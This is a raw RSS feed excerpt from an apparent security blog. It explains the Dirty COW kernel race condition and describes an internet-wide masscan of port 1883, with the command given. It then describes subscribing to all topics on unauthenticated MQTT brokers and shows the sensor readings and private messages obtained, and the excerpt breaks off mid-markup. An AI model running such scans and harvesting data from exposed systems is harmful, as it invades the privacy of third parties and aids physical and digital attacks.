      <guid>http://marcoramilli.com/post/dirty-cow-notes/</guid>
      <description>&lt;div dir=&#34;ltr&#34; style=&#34;text-align: left;&#34; trbidi=&#34;on&#34;&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;I am not used to write about vulnerabilities because there are too much vulnerabilities out here and writing about just one of them is not going to contribute security community at all. So why am I writing about Diry Cow ? I am going to write about it because, in my personal opinion, it is huge. When I say &#34;huge&#34; I don&#39;t really mean it will be used to exploit the &#34;entire world&#34; but I mean it highlights two mains issues:&lt;/div&gt;&lt;ul style=&#34;text-align: left;&#34;&gt;&lt;li style=&#34;text-align: justify;&#34;&gt;Even patched code could easily hide the same vulnerability, just in a different way. How many patched code are not really &#34;patched&#34; ?&lt;/li&gt;&lt;li style=&#34;text-align: justify;&#34;&gt;A new pragmatic approach to identify vulnerabilities: looking into patched code and check the &amp;nbsp;patch implementation.&lt;/li&gt;&lt;/ul&gt;&lt;div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;But let&#39;s start from the beginning by taking a closer look to the exploit code.&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://3.bp.blogspot.com/-deIqh3KInyI/WBTE1Y7841I/AAAAAAAANbo/qaxDhLJ9HW0BwGkp5HIzHH4GzxvdJMfuwCLcB/s1600/Screen%2BShot%2B2016-10-29%2Bat%2B17.47.35.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;640&#34; src=&#34;https://3.bp.blogspot.com/-deIqh3KInyI/WBTE1Y7841I/AAAAAAAANbo/qaxDhLJ9HW0BwGkp5HIzHH4GzxvdJMfuwCLcB/s640/Screen%2BShot%2B2016-10-29%2Bat%2B17.47.35.png&#34; width=&#34;376&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Click to enlarge: Taken From &lt;a href=&#34;https://www.exploit-db.com/exploits/40611/?rss&#34;&gt;Here&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;&lt;div&gt;As many other kernel vulnerabilities it relays on concurrency; the exploit code fires on two separate threads who will access at the same time to the same resource. &amp;nbsp;Taking a closer look to the main function you will see that the &lt;a href=&#34;http://man7.org/linux/man-pages/man2/mmap.2.html&#34;&gt;mmap&lt;/a&gt; syscall has been used.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://3.bp.blogspot.com/-hXNSwoh-XT4/WBTF1tl3BZI/AAAAAAAANbw/NP5vFh74K1c3LyjgIAD9oWfBIWkTyTA_ACLcB/s1600/Screen%2BShot%2B2016-10-29%2Bat%2B17.52.31.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;15&#34; src=&#34;https://3.bp.blogspot.com/-hXNSwoh-XT4/WBTF1tl3BZI/AAAAAAAANbw/NP5vFh74K1c3LyjgIAD9oWfBIWkTyTA_ACLcB/s400/Screen%2BShot%2B2016-10-29%2Bat%2B17.52.31.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;calling mmap function&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div&gt;From documentation:&lt;/div&gt;&lt;div&gt;&lt;blockquote class=&#34;tr_bq&#34;&gt;&lt;i&gt;creates a new mapping in the virtual address space of the        calling process.  The starting address for the new mapping is        specified in addr.  The length argument specifies the length of the        mapping.  &lt;/i&gt;&lt;/blockquote&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;mmap does not create a memory copy but rather it creates a new mapping of that (filedescriptor) memory area. It means the process will read data directly from the original file rather than from a copy of it. &amp;nbsp;While most of the parameters are obvious the MAP_PRIVATE flag is the &#34;core&#34; of the vulnerability. It enables the &#34;copy on write&#34; (from here the name COW) which basically copies the original data in a new memory area during the write access to the same data. Since the mmap has just mapped a readonly area and the process wants to write data on it, mmap (MAP_PRIVATE) will create a copy of that data on write actions, the modified data will not be propagated to the original memory area.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Now the exploit runs two threads which will exploit a race condition to get &#34;write access&#34; to the original memory area. The first thread runs several times the function call madvise (memory advise) which is used to increase process performances by tagging a memory area according to its usage: for example &amp;nbsp;the memory could be tagged as NORMAL, &amp;nbsp;SEQUENTIAL, FREE or WILLNEED, an so on... In the exploit, the mmap memory is continuously tagged as DONTNEED, &amp;nbsp;which basically means the memory is not going to be used in the next future so the kernel could free its space&lt;b&gt; and reload the content only when needed.&lt;/b&gt;&lt;/div&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://4.bp.blogspot.com/-vvMCqgQMYCQ/WBTKi4ZGwSI/AAAAAAAANb8/gWdj42bc_l8w_OtknUc5NtWswOFQ_wiwwCLcB/s1600/Screen%2BShot%2B2016-10-29%2Bat%2B18.12.31.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;211&#34; src=&#34;https://4.bp.blogspot.com/-vvMCqgQMYCQ/WBTKi4ZGwSI/AAAAAAAANb8/gWdj42bc_l8w_OtknUc5NtWswOFQ_wiwwCLcB/s400/Screen%2BShot%2B2016-10-29%2Bat%2B18.12.31.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;First Thread implementing madvise&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;On the other hand another thread is writing on its own memory space (by abusing the pseudo file notation: /proc/self/mem) directly on the mmap area pointing to the opened file. Since we have invoked the mmap function through the MAP_PRIVATE flag we are not going to write on the specifi memory but on a copy of it (copy on write).&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://4.bp.blogspot.com/-rkbL92c6zBU/WBTL2yzxaII/AAAAAAAANcA/8kXEINmIszM4dhLxHjOZsdkpFwRHHdrBQCLcB/s1600/Screen%2BShot%2B2016-10-29%2Bat%2B18.17.23.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;175&#34; src=&#34;https://4.bp.blogspot.com/-rkbL92c6zBU/WBTL2yzxaII/AAAAAAAANcA/8kXEINmIszM4dhLxHjOZsdkpFwRHHdrBQCLcB/s400/Screen%2BShot%2B2016-10-29%2Bat%2B18.17.23.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Second Thread implementing write on pseudo self/mem&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;The race condition between those two threads tricks the write on copy on the original memory area since the copied area could be tagged has DONTNEED while the write procedure is not finished yet. And voilà you are going to write in a readonly file !&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;OK now we figured out how the trick worked so far but what is most interesting is the story behind it?&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Going on &lt;a href=&#34;https://lkml.org/lkml/2016/10/19/860&#34;&gt;issue tracker:&lt;/a&gt; Linus Trovalds (maximum respect) wrote:&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;blockquote class=&#34;tr_bq&#34; style=&#34;text-align: justify;&#34;&gt;This is an ancient bug that was actually attempted to be fixed once (badly) by me eleven years ago in commit 4ceb5db9757a (&#34;Fix get_user_pages() race for write access&#34;) but that was then undone due to problems on s390 by commit f33ea7f404e5 (&#34;fix get_user_pages bug&#34;).  In the meantime, the s390 situation has long been fixed, and we can now fix it by checking the pte_dirty() bit properly (and do it better).  The s390 dirty bit was implemented in abf09bed3cce (&#34;s390/mm: implement software dirty bits&#34;) which made it into v3.9.  Earlier kernels will have to look at the page state itself.  Also, the VM has become more scalable, and what used a purely theoretical race back then has become easier to trigger.&lt;/blockquote&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;S390 is ancient IBM technology.... I am not even sure it still exists on real world (at least if compared to recent systems). Probably linux community forgot about that removal otherwise would left it in the recent memory managers.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Anyhow the bug now &#34;has been fixed&#34; by introducing a new internal Flag called FOLL_COW (really !?J) which basically says &#34;yes I already did the copy on write&#34;.&lt;br /&gt;Basically the process can write to even unwritable pte&#39;s, but only after it has gone through a COW cycle and they are dirty. Following the diff patch&lt;br /&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-Tl_WbTpGwvo/WBTTGVtIzjI/AAAAAAAANcU/-iS6SeZ2HNQUv06yMyDJaZOStbQzhY61QCLcB/s1600/Screen%2BShot%2B2016-10-29%2Bat%2B18.48.56.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;400&#34; src=&#34;https://1.bp.blogspot.com/-Tl_WbTpGwvo/WBTTGVtIzjI/AAAAAAAANcU/-iS6SeZ2HNQUv06yMyDJaZOStbQzhY61QCLcB/s400/Screen%2BShot%2B2016-10-29%2Bat%2B18.48.56.png&#34; width=&#34;367&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Dirty Cow Patch3 on October 2016&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;&lt;/div&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Dirty Cow vulnerability blowed in my mind a new vulnerability hunting process. On one hand laboratories with extremely sophisticated, tuned and personalised fuzzers perform the &#34;industrial&#34; way (corporate and/or governative) to find new vulnerabilities, on the other hand more romantic and crafty way done by professionals and/or security researchers used to adopt handy works and smart choices. But another smart approach (industrial or romantic) could be to investigate into the patched code by itself.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Patched code is by definition where a bug or issue where located. The most difficult part of finding vulnerabilities (not exploiting them) is to figure out where they are in thousands lines of code. So finding vulnerability on patched code could be much more quick even if with high &#34;hypothetical&#34; complexity since a patch is involved. But as this case testifies ... &amp;nbsp;is not always the case!&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;
</description>
    </item>
    
    <item>
      <title>Cybersecurity Awareness</title>
      <link>http://marcoramilli.com/post/cybersecurity-awareness/</link>
      <pubDate>Mon, 17 Oct 2016 05:31:00 UTC</pubDate>
      
      <guid>http://marcoramilli.com/post/cybersecurity-awareness/</guid>
      <description>&lt;div dir=&#34;ltr&#34; style=&#34;text-align: left;&#34; trbidi=&#34;on&#34;&gt;My little contribution on cybersecurity to national TV channel; next to Evgenij Valentinovič Kasperskij, founder of Kaspersky Anti Virus Engine. &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: center;&#34;&gt;&lt;iframe allowfullscreen=&#34;&#34; class=&#34;YOUTUBE-iframe-video&#34; data-thumbnail-src=&#34;https://i.ytimg.com/vi/KRNGgaQl5HE/0.jpg&#34; frameborder=&#34;0&#34; height=&#34;266&#34; src=&#34;https://www.youtube.com/embed/KRNGgaQl5HE?feature=player_embedded&#34; width=&#34;320&#34;&gt;&lt;/iframe&gt;&lt;/div&gt;&lt;br /&gt;&lt;/div&gt;
</description>
    </item>
    
    <item>
      <title>Internet of Broken Things: Threats are changing, so are we ?</title>
      <link>http://marcoramilli.com/post/internet-of-broken-things-threats-are-changing-so-are-we-/</link>
      <pubDate>Tue, 20 Sep 2016 00:17:00 UTC</pubDate>
      
      <guid>http://marcoramilli.com/post/internet-of-broken-things-threats-are-changing-so-are-we-/</guid>
      <description>&lt;div dir=&#34;ltr&#34; style=&#34;text-align: left;&#34; trbidi=&#34;on&#34;&gt;Hi Folks, this is another blog-post on internet of &#34;broken things&#34;. As many of you are familiar with MQTT is one of the most used protocol over the Internet of Things. It&#39;s widely used in private area network - to make communications quick and light - and on public network as well - to build communication channels between sensors end / or servers messages -&lt;br /&gt;&lt;blockquote class=&#34;tr_bq&#34; style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;MQTT is a machine-to-machine (M2M)/&#34;Internet of Things&#34; connectivity protocol. It was designed as an extremely lightweight publish/subscribe messaging transport. It is useful for connections with remote locations where a small code footprint is required and/or network bandwidth is at a premium. For example, it has been used in sensors communicating to a broker via satellite link, over occasional dial-up connections with healthcare providers, and in a range of home automation and small device scenarios. t is also ideal for mobile applications because of its small size, low power usage, minimised data packets, and efficient distribution of information to one or many receivers.&lt;/blockquote&gt;&lt;br /&gt;Inspired by Luca Lundgren talk on &lt;a href=&#34;https://www.defcon.org/html/defcon-24/dc-24-index.html&#34;&gt;Defcon 24 titled&lt;/a&gt;: &#34;Light Weight Protocol! Serious Equipment! Critical Implications!&#34; I decided to verify myself the state of the art on MQTT implementations.&lt;br /&gt;&lt;br /&gt;&lt;b&gt;How MQTT works:&lt;/b&gt;&lt;br /&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Understanding how MQTT protocol works, invented by Andy Stanford-Clark di IBM and Arlen Nipper Cirrus Link Solutions, is crucial to figure out why poorly authentication implementations will cause serious information disclosure issues.. MQTT stands for Message Queue Telemetry Transport and now is an&amp;nbsp;&lt;a href=&#34;https://www.oasis-open.org/news/announcements/mqtt-version-3-1-1-becomes-an-oasis-standard&#34;&gt;OASIS&lt;/a&gt;&amp;nbsp;standard. It has been designed for sending telemetry data and often runs the challenge against REST HTTP API in modern IoT environments. While is not a common protocol to build communication between clouds (and servers) since AMQP (Advanced Message Queuing Protocol) is much more expressive and performant it is often preferred to to build communication between small objects (things) to small objects (things).&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;The protocol relays on a central node called &#34;Broker&#34; who is organised in specific programmable topics. &lt;b&gt;Publishers&lt;/b&gt; (things) are able to publish informations to specific topics (such as but not limited to: temperature, localization, humidity, etc. ) while &lt;b&gt;subscribers&lt;/b&gt;&amp;nbsp;(applications) are able to get data from an interested and explicit topic. The following image represents a general architectural view. It&#39;s clear that a poorly implemented authentication mechanism will let the subscribers free to get the overall published data.&lt;/div&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://4.bp.blogspot.com/-ql7SSes6M7U/V9496M1ERfI/AAAAAAAANTk/2uESmYpS6_Y25XWInks8h28pqqFoLxLDACLcB/s1600/mqtt.jpg&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;132&#34; src=&#34;https://4.bp.blogspot.com/-ql7SSes6M7U/V9496M1ERfI/AAAAAAAANTk/2uESmYpS6_Y25XWInks8h28pqqFoLxLDACLcB/s400/mqtt.jpg&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;MQTT Architecture Flow&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;The beauty of unauthenticated MQTT sessions is in the subscriber topic list. &amp;nbsp;Indeed it is able to subscribe to every topic on the selected brokers by simply putting an # as topic even if it does not know the topics list.&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Simple Experiment:&lt;/b&gt;&lt;br /&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;Let assume we might find some unauthenticated MQTT brokers, what kind of message could be identified ? Hopefully not sensible data. Let&#39;s see it !&lt;br /&gt;&lt;br /&gt;Step 1: Discovery.&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;a href=&#34;https://github.com/robertdavidgraham/masscan&#34;&gt;masscan&lt;/a&gt; even if not &amp;nbsp;assiduously upgraded is still one of my best solution to map Internet. I performed a simple massive scan in order to figure out servers with open ports on 1883 (it&#39;s the default MQTT broker port). I know... if a server owns a 1883 open port does not mean it runs a MQTT broker on it.. I totally agree but my point is not a quantitative analysis but a quality analysis, so I do not care about how many real MQTT brokers are out there but if I can find sensible data on one of them.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34; style=&#34;background-color: black;&#34;&gt;&lt;span style=&#34;color: #6aa84f;&#34;&gt;sudo bin/masscan 0.0.0.0/0 --exclude 255.255.255.255 -p1883 --max-rate 10000 -oX mas1883.xml&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: center;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;After few hours thousands of ip populate my &#34;mas1883.xml&#34; file&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Step 2: Identification.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Assuming we get thousands of valid IPs running MQTT brokers we need to try to subscribe to all of them and try to subscribe to every topic. Let&#39;s write a quick&#39;n dirty 20 lines of code to make it happens.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://4.bp.blogspot.com/-DqnseVk3hxk/V95Ebvp3eYI/AAAAAAAANT8/zgI8mlcYQ04aiZvoyNNAeeienG7-st8FgCLcB/s1600/Screen%2BShot%2B2016-09-18%2Bat%2B09.38.00.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;200&#34; src=&#34;https://4.bp.blogspot.com/-DqnseVk3hxk/V95Ebvp3eYI/AAAAAAAANT8/zgI8mlcYQ04aiZvoyNNAeeienG7-st8FgCLcB/s640/Screen%2BShot%2B2016-09-18%2Bat%2B09.38.00.png&#34; width=&#34;580&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Quick&#39;n dirty script automation subscriptions (click to enlarge)&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Step 3: Results Analysis&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;After few running hours, I&#39;ve got back interesting results (they were piped into different files from the launch bash script, so simple I did not even mentioned it). In order to describe the results I&#39;d like to classify them into two simple sections: &lt;b&gt;Note sensible data&lt;/b&gt; and &lt;b&gt;Sensible data&lt;/b&gt;.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;Not sensible data&lt;/b&gt;. MQTT messages that does not refer directly to sensible information but still interesting from attackers such as: Temperature, &amp;nbsp;Presence, &amp;nbsp;Lights sensors and commercial. If those informations get to malicious physical attacker&#39;s hands he can figure out if when to physically attack the building since it is easy to detect human presence. The following image shows &amp;nbsp;records belonging to Presence Sensors (PIR), Power Sensors, Humidity Sensors, Temperature Sensors and Noise Sensors.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;float: left; margin-right: 1em; text-align: left;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-uTn902VN45I/V95Nh5oMrLI/AAAAAAAANUM/qsedt_MIZNUeW6Z6Z7EDZQ7V3RPKx0U3gCLcB/s1600/Screen%2BShot%2B2016-09-18%2Bat%2B10.14.46.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;150&#34; src=&#34;https://1.bp.blogspot.com/-uTn902VN45I/V95Nh5oMrLI/AAAAAAAANUM/qsedt_MIZNUeW6Z6Z7EDZQ7V3RPKx0U3gCLcB/s640/Screen%2BShot%2B2016-09-18%2Bat%2B10.14.46.png&#34; width=&#34;580&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Anonymised Not Sensible Data (click to enlarge)&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;For example an attacker could use those data to understand if in a room -- of such anonymised building -- are people in there (thanks to the value of the PIR sensor) or if someone is close to the room (thanks to noise sensors) or if somebody has been in the room (thanks to delta temperature sensors). Those informations are useful to plan an attack. So even these informations are not sensible per se it is still important to protect them.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Another great example comes from an unauthenticated server hosting &lt;a href=&#34;https://www.smartthings.com/&#34;&gt;Samsung Smartthings&lt;/a&gt;&amp;nbsp;devices.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;float: left; margin-right: 1em; text-align: left;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-fXV3hWdozGA/V95PhsqDhuI/AAAAAAAANUY/7H6ZYqU7wK4ZnbxccZ5XBrIrb9uRWRgBACLcB/s1600/Screen%2BShot%2B2016-09-18%2Bat%2B10.25.14.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;200&#34; src=&#34;https://1.bp.blogspot.com/-fXV3hWdozGA/V95PhsqDhuI/AAAAAAAANUY/7H6ZYqU7wK4ZnbxccZ5XBrIrb9uRWRgBACLcB/s640/Screen%2BShot%2B2016-09-18%2Bat%2B10.25.14.png&#34; width=&#34;580&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Samsung Smartthings devices data (click to enlarge)&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;As you might see (enlarging the previous image.. :) we can totally monitor the &#34;building&#34;. We know where sensors have been placed (network_cabinet, master_bedroom, parkers_closet, garage_door, home_assistant) &amp;nbsp;and what value do they have. It is not hard to find an empty room or an empty room_door_path to a target in the building.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;Sensible&lt;/b&gt; &lt;b&gt;data. &lt;/b&gt;MQTT data that directly refers to private information&lt;b&gt;&amp;nbsp;&lt;/b&gt;such as (but not limited to): Text Messages and Phone Geolocalization. &amp;nbsp;The following image shows text messages between two users. The used language is Italian and a close translation could be:&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;- &#34;Talk to you soon&#34;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;- &#34;Bye&#34;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;float: left; margin-right: 1em; text-align: left;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-HEty4ImHm9g/V95RFKgEuCI/AAAAAAAANUk/7THi0BlWHTsPs9Opp8pQczhxZFLMUkgIACLcB/s1600/Screen%2BShot%2B2016-09-18%2Bat%2B10.31.10.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;60&#34; src=&#34;https://1.bp.blogspot.com/-HEty4ImHm9g/V95RFKgEuCI/AAAAAAAANUk/7THi0BlWHTsPs9Opp8pQczhxZFLMUkgIACLcB/s640/Screen%2BShot%2B2016-09-18%2Bat%2B10.31.10.png&#34; width=&#34;580&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Anonymised Private Messages (click to enlarge)&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;The following image shows private information between pharmaceutical products (please do not ask me more about it... I wont give out much details, the pharmaceutical service has been alerted).&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;float: left; margin-right: 1em; text-align: left;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a 